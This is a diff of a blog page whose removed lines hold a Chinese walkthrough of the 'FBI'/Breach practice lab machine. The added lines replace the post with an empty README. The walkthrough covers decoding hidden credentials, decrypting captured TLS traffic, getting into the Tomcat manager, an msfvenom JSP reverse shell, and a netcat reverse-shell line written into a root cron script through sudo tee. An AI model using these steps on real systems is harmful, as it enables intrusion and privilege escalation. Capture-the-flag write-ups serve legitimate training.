@@ -5,8 +5,8 @@
 <head>
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8737655325828146" crossorigin="anonymous"></script>
     <meta charset="utf-8">
-    <meta name="keywords" content="“FBI”靶机渗透, CTF,网络安全,WEB,技术,r3x5ur,前端">
-    <meta name="description" content="“FBI”靶机渗透">
+    <meta name="keywords" content="CTF,网络安全,WEB,技术,r3x5ur,前端">
+    <meta name="description" content="🔰 A noob who likes web penetration 🔰 ✔ Also a web developer✔">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>“FBI”靶机渗透 | r3x5ur</title>
+    <title>r3x5ur</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -367,12 +367,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/static/covers/PT3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">“FBI”靶机渗透</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -394,25 +394,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/penetration-test/">
-                                <span class="chip bg-color">penetration-test</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/security/" class="post-category">
-                                security
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -421,28 +408,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-22
+                    2023-04-03
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-11
+                    2023-04-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.6k
+                    3
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    1 分
                 </div>
                 
 
@@ -465,281 +452,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="FBI靶机渗透"><a href="#FBI靶机渗透" class="headerlink" title="FBI靶机渗透"></a>FBI靶机渗透</h1><h2 id="1-渗透过程"><a href="#1-渗透过程" class="headerlink" title="1. 渗透过程"></a>1. 渗透过程</h2><ul>
-<li><p>给出了IP地址为固定的<code>192.168.110.140</code></p>
-</li>
-<li><p>而我当前上网的ip为:<code>192.168.0.101</code></p>
-</li>
-<li><p>这里给配置电脑两个IP地址</p>
-</li>
-<li><p>先配置一个静态然后点高级添加一个IP地址就可以了</p>
-</li>
-<li><p>下面开始收集信息</p>
-</li>
-<li><p>用nmap扫描端口 <code>nmap -v -A -oN /tmp/fbi.txt</code></p>
-</li>
-<li><p>扫描结果发现开启了1000个端口996个服务</p>
-</li>
-<li><p>显然这不正常</p>
-</li>
-<li><p>那我们直接去看看web: <code>http://192.168.110.140</code></p>
-</li>
-<li><p>主页的文字翻译：</p>
-</li>
-</ul>
-<blockquote>
-<p>Initech被攻破，董事会投票决定聘请其内部的Initech网络咨询有限责任合伙公司分部提供协助。鉴于此次违约事件的高调性和近乎灾难性的损失，随后针对该公司的尝试也很多。Initech指派了由Bill Lumbergh、CISSP和Peter Gibbons，C | EH，SEC+，NET+，A+领导的顶级顾问来控制和分析漏洞。<br>该公司几乎没有意识到，这一漏洞不是熟练的黑客所为，而是一位心怀不满的前员工在离开时送给他的离别礼物。顶级顾问一直在努力控制漏洞。然而，他们自己的职业道德和留下的烂摊子可能是公司的垮台。</p>
-</blockquote>
-<ul>
-<li><p>好像没啥用….</p>
-</li>
-<li><p>F12看到这么一串东西看起来很像base64</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</li>
-<li><p>解密之后：<code>cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</code>好像还是base64</p>
-</li>
-<li><p>再解密：<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
-</li>
-<li><p>键值对？会不会是密码，发现主页的图片的超链接里面有个可以输入密码的</p>
-</li>
-<li><p>还真是密码</p>
-</li>
-<li><p>登录进去之后发现有三封未读的邮件</p>
-</li>
-<li><p>第一封:</p>
-<blockquote>
-<p>主题: <strong>Posting sensitive content</strong> (发布敏感内容)</p>
-<p>内容: Peter, yeahhh, I’m going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that’d be great. -Bill</p>
-<p>彼得，是的，我得去问你，让你的团队只在管理门户上发布任何敏感的工件。我的密码非常安全。如果你能把一切都告诉他们那就太好了。-比尔</p>
-</blockquote>
-</li>
-<li><p>第二封:</p>
-<blockquote>
-<p>主题:IDS&#x2F;IPS system</p>
-<p>内容:Hey Peter,</p>
-<p>I got a really good deal on an IDS&#x2F;IPS system from a vendor I met at that happy hour at Chotchkie’s last week!  -Michael</p>
-<p>嗨，彼得，上周在Chotchkie的欢乐时光里，我遇到一个供应商，他给我提供了一个非常好的ID&#x2F;IPS系统！  -迈克尔</p>
-</blockquote>
-</li>
-<li><p>第三封</p>
-<blockquote>
-<p>  主题:FWD: Thank you for your purchase of Super Secret Cert Pro!</p>
-<p>  ​         (FWD:感谢您购买超级机密证书专业版！)</p>
-<p>  内容:Peter, I am not sure what this is. I saved the file here: 192.168.110.140&#x2F;.keystore Bob ——————————————————————————————————————————————- From: <a href="mailto:&#114;&#x65;&#103;&#105;&#115;&#116;&#114;&#97;&#114;&#64;&#x70;&#x65;&#x6e;&#101;&#x74;&#x72;&#111;&#100;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#114;&#x65;&#103;&#105;&#115;&#116;&#114;&#97;&#114;&#64;&#x70;&#x65;&#x6e;&#101;&#x74;&#x72;&#111;&#100;&#x65;&#x2e;&#x63;&#111;&#x6d;</a> Sent: 02 June 2016 16:16 To: <a href="mailto:&#98;&#111;&#x62;&#64;&#105;&#110;&#x69;&#116;&#101;&#x63;&#104;&#x2e;&#x63;&#111;&#109;">&#98;&#111;&#x62;&#64;&#105;&#110;&#x69;&#116;&#101;&#x63;&#104;&#x2e;&#x63;&#111;&#109;</a>; <a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x62;&#114;&#101;&#x61;&#99;&#104;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x62;&#114;&#101;&#x61;&#99;&#104;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;</a> Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!</p>
-<p>  彼得，我不知道这是什么。我将文件保存在此处：192.168.110.140&#x2F;.keystore Bob———————————–发件人：<a href="mailto:&#x72;&#x65;&#103;&#x69;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#112;&#x65;&#110;&#101;&#116;&#x72;&#111;&#100;&#x65;&#46;&#99;&#x6f;&#109;">&#x72;&#x65;&#103;&#x69;&#115;&#116;&#114;&#x61;&#116;&#111;&#x72;&#64;&#112;&#x65;&#110;&#101;&#116;&#x72;&#111;&#100;&#x65;&#46;&#99;&#x6f;&#109;</a>发送时间：2016年6月2日16:16收件人：<a href="mailto:&#x42;&#111;&#98;&#64;&#x69;&#x6e;&#x69;&#x74;&#x65;&#99;&#x68;&#46;&#99;&#x6f;&#x6d;">&#x42;&#111;&#98;&#64;&#x69;&#x6e;&#x69;&#x74;&#x65;&#99;&#x68;&#46;&#99;&#x6f;&#x6d;</a>；<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#x62;&#x72;&#101;&#x61;&#x6b;&#x2e;&#108;&#111;&#x63;&#97;&#108;">&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#x62;&#x72;&#101;&#x61;&#x6b;&#x2e;&#108;&#111;&#x63;&#97;&#108;</a> Subject:感谢您购买超级机密证书专业版！请查找附加的新SSL证书。不要和任何人分享！</p>
-</blockquote>
-</li>
-<li><p>发现有一个证书保存在：<code>http://192.168.110.140/.keystore</code></p>
-</li>
-<li><p>keystore需要解析：<code>keytool -list -v -keystore keystore</code></p>
-</li>
-<li><p>但是需要密码…这密码是啥呢？</p>
-</li>
-<li><p>最后在<code>http://192.168.110.140/impresscms/modules/profile/index.php?uid=2</code>页面中找到一个</p>
-</li>
-<li><p><code>SSL implementation test capture</code>的超链接&gt;&gt;&gt;打开发现有一封邮件</p>
-<blockquote>
-<p>  Published by <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/modules/content/index.php?uid=2">Peter Gibbons</a> on 2016&#x2F;6&#x2F;4 21:37:05. (0 reads)</p>
-<p>  Team - I have uploaded a pcap file of our red team’s re-production of the  attack. I am not sure what trickery they were using but I cannot read  the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> They told me the alias, storepassword and keypassword are all set to ‘tomcat’. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I’m going fishing for the next 2 days and will not have access to email or phone.</p>
-<p>  由[Peter Gibbons]出版（<a target="_blank" rel="noopener" href="http://192.168.110.140/imprescms/modules/content/index.php?uid=2%EF%BC%892016%E5%B9%B46%E6%9C%884%E6%97%A521:37:05%E3%80%82%EF%BC%880%E8%AF%BB%EF%BC%89">http://192.168.110.140/imprescms/modules/content/index.php?uid=2）2016年6月4日21:37:05。（0读）</a></p>
-<p>  团队-我上传了一个关于红队重新制造攻击的pcap文件。我不知道他们在耍什么花招，但我看不懂文件。我试过从我的C | EH研究中的每一个nmap开关，但就是想不出来。<a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> 他们告诉我别名、存储密码和密钥密码都设置为“tomcat”。那有用吗？？有人知道这是什么吗？我想我们现在已经加密了？-彼得</p>
-<p>  p.s.我将在接下来的两天里去钓鱼，我将无法使用电子邮件或电话。</p>
-</blockquote>
-</li>
-<li><p>里面说存储密码和密钥密码都设置为“tomcat”而且是用于<a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E7%9A%84%E7%A7%98%E9%92%A5%E8%AF%81%E4%B9%A6">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap的秘钥证书</a></p>
-</li>
-<li><p>找打了密码那就解开来看看</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keytool <span class="token parameter variable">-list</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-keystore</span> keystore
-<span class="token comment">#结果:</span>
-密钥库类型: JKS
-密钥库提供方: SUN
-
-您的密钥库包含 <span class="token number">1</span> 个条目
-
-别名: tomcat
-创建日期: <span class="token number">2016</span>-5-21
-条目类型: PrivateKeyEntry
-证书链长度: <span class="token number">1</span>
-证书<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>:
-所有者: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">OU</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">O</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">L</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">ST</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">C</span><span class="token operator">=</span>Unknown
-发布者: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">OU</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">O</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">L</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">ST</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">C</span><span class="token operator">=</span>Unknown
-序列号: 60856e88
-有效期开始日期: Sat May <span class="token number">21</span> 01:51:07 CST <span class="token number">2016</span>, 截止日期: Fri Aug <span class="token number">19</span> 01:51:07 CST <span class="token number">2016</span>
-证书指纹:
-         MD5: C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0
-         SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
-         SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
-         签名算法名称: SHA256withRSA
-         版本: <span class="token number">3</span>
-
-扩展:
-
-<span class="token comment">#1: ObjectId: 2.5.29.14 Criticality=false</span>
-SubjectKeyIdentifier <span class="token punctuation">[</span>
-KeyIdentifier <span class="token punctuation">[</span>
-0000: <span class="token number">47</span> 6B A3 <span class="token number">37</span> ED A5 1F 0A   0D <span class="token number">61</span> CA AA <span class="token number">17</span> 9C F4 8C  Gk.7<span class="token punctuation">..</span><span class="token punctuation">..</span>.a<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
-0010: <span class="token number">10</span> <span class="token number">64</span> <span class="token number">87</span> DF                                        .d<span class="token punctuation">..</span>
-<span class="token punctuation">]</span>
-<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>用Wireshark打开SSL_test_phase1.pcap看了一下，发现都是加密的</p>
-</li>
-<li><p>那我们要导出证书</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#命令:</span>
-keytool <span class="token parameter variable">-importkeystore</span> <span class="token parameter variable">-srckeystore</span> <span class="token operator">&lt;</span>keystore路径<span class="token operator">></span> <span class="token parameter variable">-destkeystore</span> <span class="token operator">&lt;</span>证书保存的位置<span class="token punctuation">\</span>.p1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token parameter variable">-deststoretype</span> PKCS12 <span class="token parameter variable">-srcalias</span> tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-</li>
-<li><p>导出之后再将导出的证书导入Wireshark</p>
-</li>
-<li><p>开始分析他们的攻击流量</p>
-</li>
-<li><p>找到路径:<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p>
-</li>
-<li><p>接着去分析流量去</p>
-</li>
-<li><p>找到这样的一行<code>username=&quot;tomcat&quot; password=&quot;s3cret&quot;</code></p>
-</li>
-<li><p>去试试。。。</p>
-</li>
-<li><p>密码不对进不去</p>
-</li>
-<li><p>然后又在找</p>
-</li>
-<li><p>最后在一个请求头里面找到<code>Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p>
-</li>
-<li><p>base64编码，去解开<code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>这个好像是密码</p>
-</li>
-<li><p>进去之后找到一个上传war包的地方</p>
-</li>
-<li><p>使用kali生成一个shell:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.110.120 <span class="token parameter variable">-o</span> /tmp/s.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</li>
-<li><p>得到一个tomcat的shell</p>
-</li>
-<li><p>想办法提权</p>
-</li>
-<li><p>到网站目录下找到两个MD5命名的php文件</p>
-</li>
-<li><p>查看到两个都是数据库连接文件</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Database Username
-// Your database user account on the <span class="token function">host</span>
-define<span class="token punctuation">(</span> <span class="token string">'SDATA_DB_USER'</span>, <span class="token string">'root'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-// Database Password
-// Password <span class="token keyword">for</span> your database user account
-define<span class="token punctuation">(</span> <span class="token string">'SDATA_DB_PASS'</span>, <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>查看数据库的账号密码</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> user,password from user<span class="token punctuation">;</span>
-+------------------+-------------------------------------------+
-<span class="token operator">|</span> user             <span class="token operator">|</span> password                                  <span class="token operator">|</span>
-+------------------+-------------------------------------------+
-<span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span>
-<span class="token operator">|</span> milton           <span class="token operator">|</span> 6450d89bd3aff1d893b85d3ad65d2ec2          <span class="token operator">|</span>
-<span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span>
-<span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span>
-<span class="token operator">|</span> debian-sys-maint <span class="token operator">|</span> *A9523939F1B2F3E72A4306C34F225ACF09590878 <span class="token operator">|</span>
-+------------------+-------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>发现一个账户 <code>milton  ： 6450d89bd3aff1d893b85d3ad65d2ec2 </code></p>
-</li>
-<li><p>mysql都是MD5加密的碰撞之后得到：<code>thelaststraw</code></p>
-</li>
-<li><p>再看看怎么提权</p>
-</li>
-<li><p><code>cat /etc/passwd</code>看看用户信息</p>
-</li>
-<li><p>找到两个用户创建的用户</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
-<span class="token number">2</span>. blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-</li>
-<li><p><code>milton</code>这个用户和mysql的用户名一致那密码会不会也一样？</p>
-</li>
-<li><p>试试…</p>
-</li>
-<li><p>发现进去了提权到了milton普通用户</p>
-</li>
-<li><p>回到home目录下发现只有两个文件</p>
-</li>
-<li><p>一张图片，一个sh，sh里面写的是：<code>There&#39;s nothing here</code> (这里什么都没有)</p>
-</li>
-<li><p>这时候想想看图片隐写</p>
-</li>
-<li><p>用scp拿下来：<code>scp [-r &lt;dir&gt;] my_badge.jpg root@192.168.110.120:/tmp</code> </p>
-</li>
-<li><p>读取一下并没有什么东西，然后到网站目录下去看看，发现一个images文件夹</p>
-</li>
-<li><p>里面的图片都是以人名命名的，都是照片？下下来读取一下数据</p>
-</li>
-<li><p>最后在bill.png中找到一个键值对：<code>Comment：coffeestains</code>  Comment（解释）coffeestains（咖啡渍）</p>
-</li>
-<li><p>对图片的解释？可能是blumbergh的密码，都试试看</p>
-</li>
-<li><p>发现coffeestains就是blumbergh的密码，然后我们进blumbergh的账户</p>
-</li>
-<li><p>然后三部曲：<code>cd  history  crontab -l </code></p>
-</li>
-<li><p>查看home目录的内容：发现是空的</p>
-</li>
-<li><p>查看计划任务：发现啥也没有</p>
-</li>
-<li><p>查看history发现有两行特殊的</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/cleanup
-<span class="token function">cat</span> tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-</li>
-<li><p>顺藤摸瓜&gt; 我们看到tidyup.sh的内容是：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
-
-<span class="token comment">#Hacker Evasion Script </span>
-<span class="token comment">#Initech Cyber Consulting, LLC</span>
-<span class="token comment">#彼得·吉本斯和迈克尔·博尔顿-2016</span>
-<span class="token comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>
-<span class="token comment">#黑客规避脚本</span>
-<span class="token comment">#Initech网络咨询有限责任公司</span>
-<span class="token comment">#此脚本设置为每3分钟运行一次，作为对黑客的额外防御措施。</span>
-<span class="token builtin class-name">cd</span> /var/lib/tomcat6/webapps <span class="token operator">&amp;&amp;</span> <span class="token function">find</span> swingline <span class="token parameter variable">-mindepth</span> <span class="token number">1</span> <span class="token parameter variable">-maxdepth</span> <span class="token number">10</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>竟然是一个黑客防御的脚本</p>
-</li>
-<li><p>然后发现是root用户的脚本而且还是3分钟执行一次</p>
-</li>
-<li><p>我们想办法把里面的语句变成shellcode</p>
-</li>
-<li><p>查看该用户可以执行root的什么命令 <code>sudo -l</code></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#User blumbergh may run the following commands on Breach:</span>
-    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-</li>
-<li><p>发现可以使用一个tee的文件百度一看，这是一个获得标准输入的命令</p>
-</li>
-<li><p>我们通过tee将shellcode写到tidyup.sh</p>
-</li>
-<li><p>先写一个shellcode</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"mkfifo /tmp/lcawx; nc 192.168.110.120 20096 0&lt;/tmp/lcawx | /bin/sh >/tmp/lcawx 2>&amp;1; rm /tmp/lcawx"</span> <span class="token operator">></span> /tmp/s
-<span class="token comment">#再执行</span>
-<span class="token function">cat</span> /tmp/s <span class="token operator">|</span> <span class="token function">sudo</span> /usr/bin/tee /usr/share/cleanup/tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-</li>
-<li><p>kalii监听一个20096端口：<code>nc -lvp 20096</code></p>
-</li>
-<li><p>静静的等带3分钟的到来</p>
-</li>
-<li><p>然后就反弹了一个shell</p>
-</li>
-<li><p>我们再用python将提升到标准shell</p>
-<pre class="line-numbers language-none"><code class="language-none">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ul>
-<ul>
-<li>就拿到了 rootshell</li>
-</ul>
-<h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 网站账号密码：	pgibbons <span class="token builtin class-name">:</span> damnitfeel<span class="token variable">$goodtobeagang</span><span class="token variable">$ta</span>
-<span class="token number">2</span>. 红客攻击流量包地址：http://192.168.110.140/impresscms/_SSL_test_phase1.pcap
-<span class="token number">3</span>. keystore密钥地址：http://192.168.110.140/.keystore
-<span class="token number">4</span>. tomcat后台地址：	https://192.168.110.140:8443/_M@nag3Me/html
-<span class="token number">5</span>. tomcat后台账号密码：tomcat <span class="token builtin class-name">:</span> Tt<span class="token punctuation">\</span>5D8F<span class="token punctuation">(</span><span class="token comment">#!*u=G)4m7zB</span>
-<span class="token number">6</span>. mysql账号密码： root <span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>
-<span class="token number">7</span>. mysql另一个账号密码 ： milton <span class="token builtin class-name">:</span> thelaststraw（也是服务器milton用户的密码）
-<span class="token number">8</span>. 服务器用户密码：blumbergh <span class="token builtin class-name">:</span> coffeestains<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
+                <h1 id="rocket-r3x5ur-me"><a href="#rocket-r3x5ur-me" class="headerlink" title=":rocket:r3x5ur.me"></a>:rocket:<a href="http://r3x5ur.me/">r3x5ur.me</a></h1>
                 
             </div>
             <hr/>
@@ -765,7 +478,7 @@ define<span class="token punctuation">(</span> <span class="token string">'SDATA
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://r3x5ur.me/fbi/">http://r3x5ur.me/fbi/</a>
+                    <a href="http://r3x5ur.me/README.html">http://r3x5ur.me/README.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -802,11 +515,7 @@ define<span class="token punctuation">(</span> <span class="token string">'SDATA
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/penetration-test/">
-                                    <span class="chip bg-color">penetration-test</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -882,7 +591,7 @@ define<span class="token punctuation">(</span> <span class="token string">'SDATA
         repo: 'r3x5ur',
         owner: 'r3x5ur',
         admin: "r3x5ur",
-        id: '2020-05-22T00-00-00',
+        id: '2023-04-03T11-03-46',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -910,48 +619,39 @@ define<span class="token punctuation">(</span> <span class="token string">'SDATA
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/india/">
+                <a href="/README.html">
                     <div class="card-image">
                         
-                        <img src="/static/covers/PT2.jpg" class="responsive-img" alt="“抓住阿三”靶机渗透">
                         
-                        <span class="card-title">“抓住阿三”靶机渗透</span>
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            “抓住阿三”靶机渗透
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/security/" class="post-category">
-                                    security
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            r3x5ur
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/penetration-test/">
-                        <span class="chip bg-color">penetration-test</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -959,51 +659,37 @@ define<span class="token punctuation">(</span> <span class="token string">'SDATA
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/chanakya/">
+                <a href="/README.html">
                     <div class="card-image">
                         
-                        <img src="/static/covers/PT2.jpg" class="responsive-img" alt="HA:Chanakya靶机渗透">
                         
-                        <span class="card-title">HA:Chanakya靶机渗透</span>
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            vulnhub HA:Chanakya靶机渗透
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/security/" class="post-category">
-                                    security
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            r3x5ur
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/penetration-test/">
-                        <span class="chip bg-color">penetration-test</span>
-                    </a>
-                    
-                    <a href="/tags/vulnhub/">
-                        <span class="chip bg-color">vulnhub</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
